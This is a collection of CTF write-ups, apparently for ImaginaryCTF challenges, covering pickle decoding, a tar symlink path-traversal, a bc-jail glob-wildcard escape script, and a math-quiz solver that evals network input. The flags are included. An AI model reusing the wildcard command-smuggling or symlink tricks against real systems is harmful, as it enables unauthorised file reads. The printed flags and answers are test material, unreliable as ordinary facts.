# Pickle

## Description 

This pickle seems to be hiding the flag...

## Attachments

`https://imaginaryctf.org/f/1O5dx`

## Solution 

Python pickle module is used for serializing and de-serializing a Python object structure. Any object in Python can be pickled so that it can be saved on disk. What pickle does is that it “serializes” the object first before writing it to file. Pickling is a way to convert a python object (list, dict, etc.) into a character stream. The idea is that this character stream contains all the information necessary to reconstruct the object in another python script.

Here in this file there is class `FlagPrinter` in which the flag is stored in it's ASCII codes.

script

```
import pickle

f = open('out.pickle', 'rb')

class FlagPrinter:
    pass


db = pickle.load(f)
print(''.join(chr(x) for x in db.flag))

```

## flag

`ictf{cucumbers_or_pickles?}`

<br>

# Self Referencing

## Description

I recently learned that python lists can contain themselves. Here's a whole bunch of such lists - do they also contain a flag?

## Attachments

`https://imaginaryctf.org/f/LrX5f#out.pickle`

## Solution

The given pickle file contains a self referencing list.

The list contains a reference to itself. Here most of the lists just refer back to themselves, but some of them point to other lists in the bigger list. Tracing the indices of these lists through the loop gives the flag.

script

```
from pickle import load

chars = load(open('out.pickle', 'rb'))

start = chars[ord('i')]
lis = []

isFirst = True

while isFirst or start is not chars[ord('i')]:
    isFirst = False
    for i in range(128):
        if chars[i] is start:
            lis.append(i)
            break
    start = start[0]


print(''.join(chr(x) for x in lis))
```

## flag

`ictf{sphInx_oF-blaCk=qu@rTz~jUdge+my^v0w}`

<br>

# TARp

## Description

It helps to have a rain tarp when there's bad weather.

## Attachments

`https://imaginaryctf.org/f/tiUxj#server.py` 
`nc puzzler7.imaginaryctf.org 3005`

## Solution

The easiest that we can do here is to send a tar archive of symlink linking `../flag` so that when we try to read the file, it points to flag file.

## flag

`ictf{is_it_still_a_zip_slip_if_we_use_a_tar_file?}`

<br>

# Flag Market

## Description

Just buy the flag! Be warned, they can be kind of pricy... You might have to work with other people to get the money. Be warned, though ... as soon as someone finally buys the flag, the price goes right back up to max!

## Attachments

`http://puzzler7.imaginaryctf.org:4009`

## Solution

We earn around 10 rooCash from multiple accounts each and bringing down the price of the flag.

When we have enough rooCash, we buy the flag.

## flag

`ictf{purchased_with_blood_sweat_and_t3ars}`

<br>

# BC Jail


## Description

We've had some hard jail challenges(nameless & stackless). Time for some easy jail!

Note: The flag is the name of the flag file + the contents of this file. The flag filename is 22 characters long.

## Attachments

`nc puzzler7.imaginaryctf.org 4008`

## Solution

As we can see in source code there is filtering in the input which allows only `bc?/ ` characters.

Thankfully `?` character can used as alternate character in UNIX systems.

script

```
import socket


def netcat(hostname, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    data = (s.recv(1024)).decode()
    print(data)
    data = (s.recv(1024)).decode()
    print(data)

    payload = b'/b??/?c?? '
    payload += b'?' * 22
    s.send(payload + b'\n')
    data = s.recv(1024)
    print(data)

    payload = b'/b??/c?? ??????????????????????'
    s.send(payload + b'\n')
    s.recv(1024)
    data = s.recv(1024)
    print(data)


netcat('puzzler7.imaginaryctf.org', 4008)
```

## flag

`ictf{bre4k1ng_7he_j41l_like_4_b0ss!}`

<br>

# escape quikmafs

## Description

Answer 100 math questions and I'll give you the flag! There's just one small twist...

## Attachments

`nc puzzler7.imaginaryctf.org 4006`

server.py

```


from random import randint, choice
from time import time

# https://pypi.org/project/console/
from console.utils import wait_key
from console.screen import Screen


def win():
    print(screen.clear, end='')
    with screen.location(0, 0):
        print(f"Great job! {open('flag.txt').read()}")

    with screen.location(2, 0):
        print("Press any key to exit.")

    wait_key()
    exit(0)


def die(msg="Sorry, that's not correct."):
    print(screen.clear, end='')
    with screen.location(0, 0):
        print(msg)

    with screen.location(2, 0):
        print("Press any key to exit.")

    wait_key()
    exit(0)


def draw(n1, n2, op):
    eq = "%d %s %d = ?"%(n1, op, n2)
    ans = eval(eq[:-3])
    y = randint(1, 18)
    x = randint(1, 79-len(eq)-1)

    print(screen.clear, end='')
    for row in range(20):
        with screen.location(row, 0):
            if row == 0:
                print('╔' + '═'*78 + '╗', end='')
            elif row == 19:
                print('╚' + '═'*78 + '╝', end='')
            else:
                print('║' + ' '*78 + '║', end='')
                if row == y:
                    with screen.location(y, x):
                        print(eq, end='')

    with screen.location(22, 0):
        print(" "*80)
    with screen.location(22, 0):
        user_ans = int(input(">>> "))

    return ans == user_ans


def main():
    with screen.fullscreen():
        start = time()
        for i in range(100):
            n1 = randint(10000, 99999)
            n2 = randint(10000, 99999)
            op = choice('*-+^&|')
            if not draw(n1, n2, op):
                die()
            if time() - start > 100:
                die("Out of time!")
        win()


if __name__ == '__main__':
    with Screen(force=True) as screen:
        main()
```

## Solution

It is just some simple math expressions but we have only one second to solve each expression..😶

So here I am using regex and eval to compute the expression.

script

```
import socket
import re
from telnetlib import Telnet

# lis = [b'*', b'-', b'+', b'^', b'&', b'|', b'?']


def find_expr(s):
    k = re.compile(r"[0-9]{5} . [0-9]{5}", re.M)
    exp = k.search(s)[0]
    print(exp)
    return exp


def netcat(hostname, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))

    for i in range(100):
        print(i)
        data = ''
        for _ in range(3):
            data += s.recv(1024).decode()
        a = find_expr(data)
        sol = str(eval(a)).encode()
        s.send(sol + b'\n')
    print(s.recv(1024))
    # print(data[p: q-2])


host = "puzzler7.imaginaryctf.org"
port = 4006

netcat(host, port)
```

## flag

`ictf{congrats_you've_conquered_the_blackboard...for_now...}`

<br>